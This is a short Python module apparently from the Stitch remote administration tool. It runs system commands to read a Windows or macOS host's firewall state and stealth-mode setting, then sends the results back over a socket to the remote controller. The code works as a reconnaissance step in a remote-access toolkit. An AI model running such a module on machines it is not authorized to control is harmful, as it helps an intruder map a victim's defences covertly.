# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

if win_client():
    resp=run_command('netsh firewall show state')
if osx_client():
    resp = run_command('/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate')
    resp += run_command('/usr/libexec/ApplicationFirewall/socketfilterfw --getstealthmode')

send(client_socket,resp)
